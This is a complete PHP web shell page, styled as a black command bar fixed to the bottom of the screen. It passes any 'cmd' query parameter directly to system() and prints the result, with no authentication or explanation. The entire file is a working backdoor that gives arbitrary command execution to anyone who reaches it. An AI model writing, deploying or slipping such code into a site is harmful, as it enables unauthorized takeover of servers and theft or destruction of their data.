<html>
<body>
<style>

  .position-top {
    position: fixed;
    bottom: 0;
    margin: 5;
  }

  .bar {
    background: black;
    color: white;
  }

  
</style>


  
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80" class="position-top bar">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>